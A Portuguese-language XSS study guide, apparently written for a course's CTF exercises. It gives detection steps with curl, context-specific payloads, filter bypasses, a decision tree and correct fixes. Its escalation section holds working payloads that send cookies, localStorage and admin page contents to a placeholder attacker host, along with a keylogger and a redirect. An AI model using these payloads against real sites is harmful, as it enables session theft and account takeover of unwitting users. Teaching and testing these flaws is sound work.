# Cross-Site Scripting (XSS) — Guia Completo

> Input do utilizador é inserido no HTML sem escape, permitindo executar JavaScript no browser de outro utilizador.

## CWE
- CWE-79 — Improper Neutralization of Input During Web Page Generation

---

## Como reconhecer

- Qualquer campo cujo valor aparece na página depois de submetido
- Search box com resultados ("You searched for: ...")
- Comentários, notas, perfis visíveis por outros utilizadores
- Parâmetros na URL refletidos na página
- Mensagens de erro que repetem o input

---

## Tipos de XSS

| Tipo | Onde fica o payload | Quem é afetado | Persistente? |
|------|-------------------|----------------|-------------|
| **Reflected** | URL / request | Quem clicar no link | Não |
| **Stored** | Base de dados | Todos que visitam a página | Sim |
| **DOM-based** | JavaScript client-side | Quem clicar no link | Não |

---

## Teste de deteção

### Passo 1 — Confirmar que não há escape
```bash
# Testar com HTML simples
curl -s "http://TARGET/?q=<b>test</b>"
```
- Se "test" aparece em **bold** → HTML renderizado, não há escape
- Se aparece como `&lt;b&gt;test&lt;/b&gt;` → está escaped (mais difícil)

### Passo 2 — Testar payloads
```html
<!-- Payloads genéricos (do mais simples ao mais complexo) -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

### Passo 3 — Contexto importa
O payload depende de **onde** o input é inserido no HTML:

```html
<!-- Contexto: dentro de texto -->
<p>You searched for: INPUT</p>
Payload: <img src=x onerror=alert(1)>

<!-- Contexto: dentro de atributo -->
<input value="INPUT">
Payload: "><img src=x onerror=alert(1)>
Payload: " onfocus=alert(1) autofocus="

<!-- Contexto: dentro de href -->
<a href="INPUT">link</a>
Payload: javascript:alert(1)

<!-- Contexto: dentro de script -->
<script>var x = 'INPUT';</script>
Payload: ';alert(1);//
Payload: </script><img src=x onerror=alert(1)>

<!-- Contexto: dentro de comentário HTML -->
<!-- INPUT -->
Payload: --><img src=x onerror=alert(1)><!--
```

---

## Reflected XSS

O payload vai no **request** (URL param, form) e é refletido na resposta imediata.

### Metodologia
```bash
# 1. Encontrar onde o input aparece no HTML
curl -s "http://TARGET/?q=CANARY123" | grep CANARY123
# Isto mostra o contexto exato

# 2. Testar escape
curl -s "http://TARGET/?q=<b>test</b>" | grep test

# 3. Injetar
curl -s "http://TARGET/?q=<img+src=x+onerror=alert(1)>"
```

### Nos CTFs do professor
Os challenges têm uma função `grant()` no JavaScript da página:
```bash
# Payload que chama grant()
curl -s "http://TARGET/?q=<img+src=x+onerror=grant()>"

# Simular grant() diretamente (seta cookie e acede a /flag)
curl -s -b "xss_grant_CHALLENGE=1" http://TARGET/flag
```

---

## Stored XSS

O payload é **guardado** (comentário, nota, perfil) e executado quando **outro** utilizador vê a página.

### Metodologia
```bash
# 1. Submeter payload
curl -X POST http://TARGET/comment \
  -d "author=test&text=<img+src=x+onerror=alert(1)>"

# 2. Verificar se está guardado
curl -s http://TARGET/comments | grep "onerror"

# 3. Quando outro utilizador (ou bot) visitar, o JS executa
```

### Nos CTFs do professor
```bash
curl -X POST http://TARGET/log \
  -d "author=test&text=<img+src=x+onerror=grant()>"
# Simular
curl -b "xss_grant_CHALLENGE=1" http://TARGET/flag
```

---

## DOM-based XSS

O payload é processado pelo **JavaScript client-side**, não pelo servidor. O servidor pode nem refletir o payload no HTML.

### Como detetar
```bash
# O payload NÃO aparece no response do servidor
curl -s "http://TARGET/?card=<b>test</b>" | grep "<b>test"
# Se NÃO aparece → possível DOM XSS (o JS processa client-side)
```

### Sinks perigosos no JavaScript
```javascript
// Sinks que executam HTML/JS — procurar no source
element.innerHTML = ...          // HTML injection
element.outerHTML = ...
document.write(...)
document.writeln(...)
eval(...)                        // code execution
setTimeout(string, ...)
setInterval(string, ...)
new Function(string)
location = ...
location.href = ...
window.open(...)

// Sources (onde o input vem)
location.hash                    // #fragment
location.search                  // ?query
location.href
document.URL
document.referrer
window.name
postMessage data
```

### Metodologia
```bash
# 1. Ler o JavaScript da página
curl -s http://TARGET/ | grep -oP 'src="[^"]+"'
curl -s http://TARGET/static/app.js

# 2. Procurar sinks
curl -s http://TARGET/static/app.js | grep -iE 'innerHTML|outerHTML|document\.write|eval'

# 3. Seguir o fluxo: de onde vem o input (source) até onde é usado (sink)
# Se o source é location.search e o sink é innerHTML → DOM XSS

# 4. Payload no browser:
# http://TARGET/?card=<img src=x onerror=alert(1)>
```

**Nota:** DOM XSS é difícil de explorar com curl porque o JavaScript não executa. Precisas de um browser real ou de simular o resultado.

---

## Bypasses de filtros

### Filtro de `<script>`
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
```

### Filtro de `alert`
```javascript
confirm(1)
prompt(1)
console.log(1)
window['al'+'ert'](1)
eval('ale'+'rt(1)')
```

### Filtro de parenteses `()`
```javascript
alert`1`                          // template literals
onerror=alert                     // sem parenteses
throw=1;onerror=alert
```

### Filtro de aspas
```html
<img src=x onerror=alert(1)>            <!-- sem aspas -->
<img src=x onerror=alert(String.fromCharCode(49))>
```

### Filtro de `on*` (event handlers)
```html
<a href=javascript:alert(1)>click</a>
<iframe src=javascript:alert(1)>
```

### URL encoding
```
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

### HTML entities
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

---

## Escalação de XSS

Depois de confirmar XSS, o que podes fazer:

```javascript
// Roubar cookies (se não têm HttpOnly)
<img src=x onerror="new Image().src='http://TEU_IP/?c='+document.cookie">

// Roubar localStorage
<img src=x onerror="fetch('http://TEU_IP/?d='+btoa(JSON.stringify(localStorage)))">

// Fazer requests como a vítima
<img src=x onerror="fetch('/admin').then(r=>r.text()).then(t=>fetch('http://TEU_IP/?d='+btoa(t)))">

// Redirecionar
<img src=x onerror="location='http://TEU_IP/'">

// Keylogger
<img src=x onerror="document.onkeypress=e=>fetch('http://TEU_IP/?k='+e.key)">
```

---

## Árvore de decisão

```
Input aparece na RESPOSTA?
├── SIM
│   ├── Em HTML text → <img src=x onerror=alert(1)>
│   ├── Em atributo → "><img src=x onerror=alert(1)>
│   ├── Em href → javascript:alert(1)
│   ├── Em <script> → ';alert(1);//
│   └── Em comentário → --><img src=x onerror=alert(1)>
│
├── NÃO (mas JS processa o input)
│   └── DOM XSS — testar no browser
│
└── NÃO (guardado para outros verem)
    └── Stored XSS — submeter e verificar se persiste
```

---

## Fix correto

```python
# ERRADO — input direto no HTML
return f"<p>Results for: {query}</p>"

# CORRETO — template engine com auto-escaping
return render_template("results.html", query=query)
# Jinja2 escapa {{ query }} automaticamente

# CORRETO — escape manual
import markupsafe
safe = markupsafe.escape(user_input)
```

```javascript
// ERRADO
element.innerHTML = userInput;

// CORRETO
element.textContent = userInput;    // texto, não HTML
```

**Defesas adicionais:**
- **Content-Security-Policy (CSP):** `script-src 'self'` bloqueia inline scripts
- **HttpOnly cookies:** JavaScript não consegue ler `document.cookie`
- **X-Content-Type-Options: nosniff:** previne MIME-type sniffing
